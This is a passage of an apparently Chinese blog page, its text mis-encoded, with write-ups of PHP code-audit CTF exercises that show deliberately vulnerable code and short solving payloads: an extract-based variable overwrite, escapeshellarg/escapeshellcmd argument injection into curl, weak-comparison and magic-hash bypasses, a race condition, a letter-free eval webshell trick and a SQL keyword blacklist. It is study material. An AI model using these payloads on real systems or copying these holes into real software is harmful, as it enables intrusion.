id="Day3-å®ä¾‹åŒ–ä»»æ„å¯¹è±¡æ¼æ´"><a href="#Day3-å®ä¾‹åŒ–ä»»æ„å¯¹è±¡æ¼æ´" class="headerlink" title="Day3 - å®ä¾‹åŒ–ä»»æ„å¯¹è±¡æ¼æ´"></a>Day3 - å®ä¾‹åŒ–ä»»æ„å¯¹è±¡æ¼æ´</h2><p>å…ˆçœ‹ä»£ç ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class NotFound&#123;</span><br><span class="line">    function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        die(&#39;404&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(</span><br><span class="line">    function ($class)&#123;</span><br><span class="line">        new NotFound();</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line">$classname &#x3D; isset($_GET[&#39;name&#39;]) ? $_GET[&#39;name&#39;] : null;</span><br><span class="line">$param &#x3D; isset($_GET[&#39;param&#39;]) ? $_GET[&#39;param&#39;] : null;</span><br><span class="line">$param2 &#x3D; isset($_GET[&#39;param2&#39;]) ? $_GET[&#39;param2&#39;] : null;</span><br><span class="line">if(class_exists($classname))&#123;</span><br><span class="line">    $newclass &#x3D; new $classname($param,$param2);</span><br><span class="line">    var_dump($newclass);</span><br><span class="line">    foreach ($newclass as $key&#x3D;&gt;$value)</span><br><span class="line">        echo $key.&#39;&#x3D;&gt;&#39;.$value.&#39;&lt;br&gt;&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®ä¾‹åŒ–æ¼æ´ç»“åˆXXEï¼Œä¸ä¼šï¼Œå…ˆè·³è¿‡äº†ã€‚</p><h2 id="Day5-å…¨å±€å˜é‡è¦†ç›–"><a href="#Day5-å…¨å±€å˜é‡è¦†ç›–" class="headerlink" title="Day5 - å…¨å±€å˜é‡è¦†ç›–"></a>Day5 - å…¨å±€å˜é‡è¦†ç›–</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#39;index.php&#39;);</span><br><span class="line">function waf($a)&#123;</span><br><span class="line">    foreach($a as $key &#x3D;&gt; $value)&#123;</span><br><span class="line">        if(preg_match(&#39;&#x2F;flag&#x2F;i&#39;,$key))&#123;</span><br><span class="line">            exit(&#39;are you a hacker&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">foreach(array(&#39;_POST&#39;, &#39;_GET&#39;, &#39;_COOKIE&#39;) as $__R) &#123;</span><br><span class="line">    if($$__R) &#123; </span><br><span class="line">        foreach($$__R as $__k &#x3D;&gt; $__v) &#123; </span><br><span class="line">            if(isset($$__k) &amp;&amp; $$__k &#x3D;&#x3D; $__v) unset($$__k); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">if($_POST) &#123; waf($_POST);&#125;</span><br><span class="line">if($_GET) &#123; waf($_GET); &#125;</span><br><span class="line">if($_COOKIE) &#123; waf($_COOKIE);&#125;</span><br><span class="line"></span><br><span class="line">if($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line">if($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line">if(isset($_GET[&#39;flag&#39;]))&#123;</span><br><span class="line">    if($_GET[&#39;flag&#39;] &#x3D;&#x3D;&#x3D; $_GET[&#39;hongri&#39;])&#123;</span><br><span class="line">        exit(&#39;error&#39;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(md5($_GET[&#39;flag&#39;] ) &#x3D;&#x3D; md5($_GET[&#39;hongri&#39;]))&#123;</span><br><span class="line">        $url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">        $urlInfo &#x3D; parse_url($url);</span><br><span class="line">        if(!(&quot;http&quot; &#x3D;&#x3D;&#x3D; strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;&#x3D;&#x3D;&#x3D;strtolower($urlInfo[&quot;scheme&quot;])))&#123;</span><br><span class="line">            die( &quot;scheme error!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        $url &#x3D; escapeshellarg($url);</span><br><span class="line">        $url &#x3D; escapeshellcmd($url);</span><br><span class="line">        system(&quot;curl &quot;.$url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>å¾ªç¯è·å–å­—ç¬¦ä¸² <strong>GETã€POSTã€COOKIE</strong> ï¼Œå¹¶ä¾æ¬¡èµ‹å€¼ç»™å˜é‡ <strong>$__R</strong> ã€‚ç„¶ååˆ¤æ–­ <strong>$$__R</strong> å˜é‡æ˜¯å¦å­˜åœ¨æ•°æ®ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™ç»§ç»­åˆ¤æ–­è¶…å…¨å±€æ•°ç»„ <strong>GETã€POSTã€COOKIE</strong> ä¸­æ˜¯å¦å­˜åœ¨é”®å€¼ç›¸ç­‰çš„ï¼Œå¦‚æœå­˜åœ¨ï¼Œåˆ™åˆ é™¤è¯¥å˜é‡ã€‚è¿™é‡Œæœ‰ä¸ª <strong>å¯å˜å˜é‡</strong> çš„æ¦‚å¿µéœ€è¦å…ˆç†è§£ä¸€ä¸‹ã€‚</p><blockquote><p>å¯å˜å˜é‡æŒ‡çš„æ˜¯ï¼šä¸€ä¸ªå˜é‡çš„å˜é‡åå¯ä»¥åŠ¨æ€çš„è®¾ç½®å’Œä½¿ç”¨ã€‚ä¸€ä¸ªå¯å˜å˜é‡è·å–äº†ä¸€ä¸ªæ™®é€šå˜é‡çš„å€¼ä½œä¸ºå…¶å˜é‡åã€‚</p></blockquote><p>æˆ‘é€šè¿‡ <strong>GET</strong> è¯·æ±‚å‘ <strong>index.php</strong> æäº¤ <strong>flag=test</strong> ï¼Œæ¥ç€é€šè¿‡ <strong>POST</strong> è¯·æ±‚æäº¤ <strong>_GET[flag]=test</strong> ã€‚å½“å¼€å§‹éå† <strong>$_POST</strong> è¶…å…¨å±€æ•°ç»„çš„æ—¶å€™ï¼Œ <strong>$__k</strong> ä»£è¡¨ <strong>_GET[flag]</strong> ï¼Œæ‰€ä»¥ <strong>$$__k</strong> å°±æ˜¯ <strong>$_GET[flag]</strong> ï¼Œå³ <strong>test</strong> å€¼ï¼Œæ­¤æ—¶ <strong>$$__k</strong> == <strong>$__v</strong> æˆç«‹ï¼Œå˜é‡ <strong>$_GET[flag]</strong> å°±è¢« <strong>unset</strong> äº†ã€‚ä½†æ˜¯åœ¨ <strong>ç¬¬21è¡Œ</strong> å’Œ <strong>22è¡Œ</strong> æœ‰è¿™æ ·ä¸€ä¸²ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br></pre></td></tr></table></figure><p><strong>extract</strong> å‡½æ•°çš„ä½œç”¨æ˜¯å°†å¯¹è±¡å†…çš„é”®åå˜æˆä¸€ä¸ªå˜é‡åï¼Œè€Œè¿™ä¸ªå˜é‡å¯¹åº”çš„å€¼å°±æ˜¯è¿™ä¸ªé”®åçš„å€¼ï¼Œ <strong>EXTR_SKIP</strong> å‚æ•°è¡¨ç¤ºå¦‚æœå‰é¢å­˜åœ¨æ­¤å˜é‡ï¼Œä¸å¯¹å‰é¢çš„å˜é‡è¿›è¡Œè¦†ç›–å¤„ç†ã€‚ç”±äºæˆ‘ä»¬å‰é¢é€šè¿‡ <strong>POST</strong> è¯·æ±‚æäº¤ <strong>_GET[flag] = test</strong> ï¼Œæ‰€ä»¥è¿™é‡Œä¼šå˜æˆ <strong>$_GET[flag]=test</strong> ï¼Œè¿™é‡Œçš„ <strong>$_GET</strong> å˜é‡å°±ä¸éœ€è¦å†ç»è¿‡ <strong>waf</strong> å‡½æ•°æ£€æµ‹äº†ï¼Œä¹Ÿå°±ç»•è¿‡äº† <strong>preg_match(â€˜/flag/iâ€™,$key)</strong> çš„é™åˆ¶ã€‚</p><p> å†å¾€ä¸‹å°±æ˜¯æäº¤ä¸¤ä¸ªmd5å€¼éƒ½æ˜¯0eå¼€å¤´çš„å€¼å°±å¥½äº†</p><h3 id="ç¬¬äºŒéƒ¨åˆ†"><a href="#ç¬¬äºŒéƒ¨åˆ†" class="headerlink" title="ç¬¬äºŒéƒ¨åˆ†"></a>ç¬¬äºŒéƒ¨åˆ†</h3><p>ä¸»è¦è€ƒå¯Ÿ <strong>curl</strong> è¯»å–æ–‡ä»¶ã€‚è¿™é‡Œä¸»è¦åŠ äº†ä¸¤ä¸ªå‘ï¼Œ <strong>escapeshellarg()</strong> å’Œ <strong>escapeshellcmd()</strong> ä¸€èµ·ä½¿ç”¨çš„æ—¶å€™ä¼šé€ æˆçš„é—®é¢˜ï¼Œä¸»è¦çœ‹çœ‹è¿™éƒ¨åˆ†ä»£ç ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$url &#x3D; escapeshellarg($url);</span><br><span class="line">$url &#x3D; escapeshellcmd($url);</span><br></pre></td></tr></table></figure><ul><li><strong>escapeshellarg</strong> ï¼Œå°†ç»™å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·å¹¶ä¸”èƒ½å¼•ç”¨æˆ–è€…è½¬ç ä»»ä½•å·²ç»å­˜åœ¨çš„å•å¼•å·</li><li><strong>escapeshellcmd</strong> ï¼Œä¼šå¯¹ä»¥ä¸‹çš„å­—ç¬¦è¿›è¡Œè½¬ä¹‰&amp;#;<code>|*?~&lt;&gt;^()[]{}$</code>, <code>x0A</code> å’Œ <code>xFF</code>, <code>&#39;</code> å’Œ <code>&quot;</code>ä»…åœ¨ä¸é…å¯¹å„¿çš„æ—¶å€™è¢«è½¬ä¹‰ã€‚</li></ul><p>ä¸¤ä¸ªå‡½æ•°é…åˆä½¿ç”¨å°±ä¼šå¯¼è‡´å¤šä¸ªå‚æ•°çš„æ³¨å…¥ï¼Œæˆ‘ä»¬è¯¦ç»†åˆ†æä¸€ä¸‹ï¼š</p><ol><li>ä¼ å…¥çš„å‚æ•°æ˜¯ï¼š172.17.0.2â€™ -v -d a=1</li><li>ç»è¿‡escapeshellargå¤„ç†åå˜æˆäº†â€™172.17.0.2â€™&#39;â€˜ -v -d a=1â€™ï¼Œå³å…ˆå¯¹å•å¼•å·è½¬ä¹‰ï¼Œå†ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨åˆ†æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨ã€‚</li><li>ç»è¿‡escapeshellcmdå¤„ç†åå˜æˆâ€™172.17.0.2â€™\â€˜â€™ -v -d a=1&#39;ï¼Œè¿™æ˜¯å› ä¸ºescapeshellcmdå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰.</li><li>æœ€åæ‰§è¡Œçš„å‘½ä»¤æ˜¯curl â€˜172.17.0.2â€™\â€˜â€™ -v -d a=1&#39;ï¼Œç”±äºä¸­é—´çš„\è¢«è§£é‡Šä¸º\è€Œä¸å†æ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åé¢çš„â€™æ²¡æœ‰è¢«è½¬ä¹‰ï¼Œä¸å†åé¢çš„â€™é…å¯¹å„¿æˆäº†ä¸€ä¸ªç©ºç™½è¿æ¥ç¬¦ã€‚æ‰€ä»¥å¯ä»¥ç®€åŒ–ä¸ºcurl 172.17.0.2\ -v -d a=1â€™ï¼Œå³å‘172.17.0.2\å‘èµ·è¯·æ±‚ï¼ŒPOST æ•°æ®ä¸ºa=1â€™ã€‚</li></ol><p>å…¶å®è¿™é‡Œç›´æ¥è¯»å–<code>127.0.0.1/flag.php</code>å°±å¥½äº†ã€‚</p><h2 id="Day6"><a href="#Day6" class="headerlink" title="Day6"></a>Day6</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;flag.php&#39;;</span><br><span class="line">if  (&quot;POST&quot; &#x3D;&#x3D; $_SERVER[&#39;REQUEST_METHOD&#39;])</span><br><span class="line">&#123;</span><br><span class="line">    $password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">    if (0 &gt;&#x3D; preg_match(&#39;&#x2F;^[[:graph:]]&#123;12,&#125;$&#x2F;&#39;, $password))</span><br><span class="line">    &#123;</span><br><span class="line">        echo &#39;Wrong Format&#39;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">    while (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        $reg &#x3D; &#39;&#x2F;([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)&#x2F;&#39;;</span><br><span class="line">        if (6 &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">            break;</span><br><span class="line">        $c &#x3D; 0;</span><br><span class="line">        $ps &#x3D; array(&#39;punct&#39;, &#39;digit&#39;, &#39;upper&#39;, &#39;lower&#39;);</span><br><span class="line">        foreach ($ps as $pt)</span><br><span class="line">        &#123;</span><br><span class="line">            if (preg_match(&quot;&#x2F;[[:$pt:]]+&#x2F;&quot;, $password))</span><br><span class="line">            $c +&#x3D; 1;</span><br><span class="line">        &#125;</span><br><span class="line">        if ($c &lt; 3) break;</span><br><span class="line">        if (&quot;42&quot; &#x3D;&#x3D; $password) echo $flag;</span><br><span class="line">        else echo &#39;Wrong password&#39;;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ä¸»è¦è€ƒå¯Ÿæ­£åˆ™è¡¨è¾¾å¼ï¼Œå’Œå¼±ç±»å‹æ¯”è¾ƒçš„é—®é¢˜ï¼Œ<br>| <em>alnum</em>  | å­—æ¯å’Œæ•°å­—            |<br>| â€”â€”â€“ | â€”â€”â€”â€”â€”- |<br>| <em>alpha</em>  | å­—æ¯               |<br>| <em>ascii</em>  | 0 - 127çš„asciiå­—ç¬¦  |<br>| <em>blank</em>  | ç©ºæ ¼å’Œæ°´å¹³åˆ¶è¡¨ç¬¦         |<br>| <em>cntrl</em>  | æ§åˆ¶å­—ç¬¦             |<br>| <em>digit</em>  | åè¿›åˆ¶æ•°(same as \d) |<br>| <em>graph</em>  | æ‰“å°å­—ç¬¦, ä¸åŒ…æ‹¬ç©ºæ ¼      |<br>| <em>lower</em>  | å°å†™å­—æ¯             |<br>| <em>print</em>  | æ‰“å°å­—ç¬¦,åŒ…å«ç©ºæ ¼        |<br>| <em>punct</em>  | æ‰“å°å­—ç¬¦, ä¸åŒ…æ‹¬å­—æ¯å’Œæ•°å­—   |<br>| <em>space</em>  | ç©ºç™½å­—ç¬¦ (æ¯”\så¤šå‚ç›´åˆ¶è¡¨ç¬¦) |<br>| <em>upper</em>  | å¤§å†™å­—æ¯             |<br>| <em>word</em>   | å•è¯å­—ç¬¦(same as \w) |<br>| <em>xdigit</em> | åå…­è¿›åˆ¶æ•°å­—           |</p><p>ä»£ç ä¸­å…±æœ‰ä¸‰å¤„æ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ï¼ŒæŒ¨ä¸ªçœ‹ä¸€ä¸‹ã€‚<br>ç¬¬ä¸€å¤„çš„æ­£åˆ™ <strong>/^[[:graph:]]{12,}$/</strong> ä¸ºï¼šåŒ¹é…åˆ°å¯æ‰“å°å­—ç¬¦12ä¸ªä»¥ä¸Š(åŒ…å«12)ï¼Œ<strong>^</strong> å·è¡¨ç¤ºå¿…é¡»ä»¥æŸç±»å­—ç¬¦å¼€å¤´ï¼Œ<strong>$</strong> å·è¡¨ç¤ºå¿…é¡»ä»¥æŸç±»å­—ç¬¦ç»“å°¾ã€‚ç¬¬äºŒå¤„æ­£åˆ™è¡¨è¾¾å¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$reg = <span class="string">'/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="number">6</span> &gt; preg_match_all($reg, $password, $arr))</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>è¡¨ç¤ºå­—ç¬¦ä¸²ä¸­ï¼ŒæŠŠè¿ç»­çš„ç¬¦å·ã€æ•°å­—ã€å¤§å†™ã€å°å†™ï¼Œä½œä¸ºä¸€æ®µï¼Œè‡³å°‘åˆ†å…­æ®µã€‚<br>ç¬¬ä¸‰å¤„:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ps = <span class="keyword">array</span>(<span class="string">'punct'</span>, <span class="string">'digit'</span>, <span class="string">'upper'</span>, <span class="string">'lower'</span>);</span><br><span class="line"><span class="keyword">foreach</span> ($ps <span class="keyword">as</span> $pt)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/[[:$pt:]]+/"</span>, $password))</span><br><span class="line">    $c += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($c &lt; <span class="number">3</span>) <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>è¡¨ç¤ºä¸ºè¾“å…¥çš„å­—ç¬¦ä¸²è‡³å°‘å«æœ‰ç¬¦å·ã€æ•°å­—ã€å¤§å†™ã€å°å†™ä¸­çš„ä¸‰ç§ç±»å‹ã€‚ç„¶åé¢˜ç›®æœ€åå°† <strong>$password</strong> ä¸42è¿›è¡Œäº†å¼±æ¯”è¾ƒã€‚<br>æœ€åpyayloadä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">42.000e-0000</span><br></pre></td></tr></table></figure><h3 id="Day7"><a href="#Day7" class="headerlink" title="Day7"></a>Day7</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a &#x3D; &quot;hongri&quot;;</span><br><span class="line">echo $a;</span><br><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">@parse_str($id);</span><br><span class="line">if ($a[0] !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; md5($a[0]) &#x3D;&#x3D; md5(&#39;QNKCDZO&#39;)) &#123;</span><br><span class="line">    echo &#39;&lt;a href&#x3D;&quot;uploadsomething.php&quot;&gt;flag is here&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">$referer &#x3D; $_SERVER[&#39;HTTP_REFERER&#39;];</span><br><span class="line">if(isset($referer)!&#x3D;&#x3D; false) &#123;</span><br><span class="line">    $savepath &#x3D; &quot;uploads&#x2F;&quot; . sha1($_SERVER[&#39;REMOTE_ADDR&#39;]) . &quot;&#x2F;&quot;;</span><br><span class="line">    if (!is_dir($savepath)) &#123;</span><br><span class="line">        $oldmask &#x3D; umask(0);</span><br><span class="line">        mkdir($savepath, 0777);</span><br><span class="line">        umask($oldmask);</span><br><span class="line">    &#125;</span><br><span class="line">    if ((@$_GET[&#39;filename&#39;]) &amp;&amp; (@$_GET[&#39;content&#39;])) &#123;</span><br><span class="line">        &#x2F;&#x2F;$fp &#x3D; fopen(&quot;$savepath&quot;.$_GET[&#39;filename&#39;], &#39;w&#39;);</span><br><span class="line">        $content &#x3D; &#39;HRCTF&#123;y0u_n4ed_f4st&#125;   by:l1nk3r&#39;;</span><br><span class="line">        file_put_contents(&quot;$savepath&quot; . $_GET[&#39;filename&#39;], $content);</span><br><span class="line">        $msg &#x3D; &#39;Flag is here,come on~ &#39; . $savepath . htmlspecialchars($_GET[&#39;filename&#39;]) . &quot;&quot;;</span><br><span class="line">        usleep(100000);</span><br><span class="line">        $content &#x3D; &quot;Too slow!&quot;;</span><br><span class="line">        file_put_contents(&quot;$savepath&quot; . $_GET[&#39;filename&#39;], $content);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>å…ˆæäº¤ä¸€ä¸ª<code>id=a[0]=s878926199a</code>ï¼Œç„¶åæ¡ä»¶ç«äº‰ä¸€ä¸‹å°±å¥½äº†ã€‚</p><h3 id="Day8"><a href="#Day8" class="headerlink" title="Day8"></a>Day8</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F;include &#39;flag.php&#39;;</span><br><span class="line">if(isset($_GET[&#39;code&#39;]))&#123;</span><br><span class="line">    $code&#x3D;$_GET[&#39;code&#39;];</span><br><span class="line">    if(strlen($code)&gt;40)&#123;</span><br><span class="line">        die(&quot;Long.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&quot;&#x2F;[A-Za-z0-9]+&#x2F;&quot;,$code))&#123;</span><br><span class="line">        die(&quot;NO.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    @eval($code);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">&#x2F;&#x2F; $hint &#x3D; &quot;php function getFlag() to get flag&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ— å­—æ¯æ•°å­—webshellï¼Œç›´æ¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo urlencode(~&#39;phpinfo&#39;);</span><br><span class="line">&#x2F;&#x2F;è¾“å‡ºï¼š%8F%97%8F%96%91%99%90</span><br></pre></td></tr></table></figure><p>ç„¶åæäº¤<code>?code=(~%8F%97%8F%96%91%99%90)()</code>ï¼Œä¾¿å¯ä»¥äº†ã€‚</p><h3 id="Day10"><a href="#Day10" class="headerlink" title="Day10"></a>Day10</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#39;config.php&#39;;</span><br><span class="line">function stophack($string)&#123;</span><br><span class="line">    if(is_array($string))&#123;</span><br><span class="line">        foreach($string as $key &#x3D;&gt; $val) &#123;</span><br><span class="line">            $string[$key] &#x3D; stophack($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        $raw &#x3D; $string;</span><br><span class="line">        $replace &#x3D; array(&quot;\\&quot;,&quot;\&quot;&quot;,&quot;&#39;&quot;,&quot;&#x2F;&quot;,&quot;*&quot;,&quot;%5C&quot;,&quot;%22&quot;,&quot;%27&quot;,&quot;%2A&quot;,&quot;~&quot;,&quot;insert&quot;,&quot;update&quot;,&quot;delete&quot;,&quot;into&quot;,&quot;load_file&quot;,&quot;outfile&quot;,&quot;sleep&quot;,);</span><br><span class="line">        $string &#x3D; str_ireplace($replace, &quot;HongRi&quot;, $string);</span><br><span class="line">        $string &#x3D; strip_tags($string);</span><br><span class="line">        if($raw!&#x3D;$string)&#123;</span><br><span class="line">            error_log(&quot;Hacking attempt.&quot;);</span><br><span class="line">            header(&#39;Location: &#x2F;error&#x2F;&#39;);</span><br><span class="line">        &#125;</span><br><span class="line">        return trim($string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$conn &#x3D; new mysqli($servername, $username, $password, $dbname);</span><br><span class="line">if ($conn-&gt;connect_error) &#123;</span><br><span class="line">    die(&quot;è¿æ¥å¤±è´¥: &quot;);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#39;id&#39;]) &amp;&amp; $_GET[&#39;id&#39;])&#123;</span><br><span class="line">    $id &#x3D; stophack($_GET[&#39;id&#39;]);</span><br><span class="line">    $sql &#x3D; &quot;SELECT * FROM students WHERE id&#x3D;$id&quot;;</span><br><span class="line">    $result &#x3D; $conn-&gt;query($sql);</span><br><span class="line">    if($result-&gt;num_rows &gt; 0)&#123;</span><br><span class="line">        $row &#x3D; $result-&gt;fetch_assoc();</span><br><span class="line">        echo &#39;&lt;center&gt;&lt;h1&gt;æŸ¥è¯¢ç»“æœä¸ºï¼š&lt;&#x2F;h1&gt;&lt;pre&gt;&#39;.&lt;&lt;&lt;EOF</span><br><span class="line">        +----+---------+--------------------+-------+</span><br><span class="line">        | id | name    | email              | score |</span><br><span class="line">        +----+---------+--------------------+-------+</span><br><span class="line">        |  &#123;$row[&#39;id&#39;]&#125; | &#123;$row[&#39;name&#39;]&#125;   | &#123;$row[&#39;email&#39;]&#125;   |   &#123;$row[&#39;score&#39;]&#125; |</span><br><span class="line">        +----+---------+--------------------+-------+&lt;&#x2F;center&gt;</span><br><span class="line">EOF;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else die(&quot;ä½ 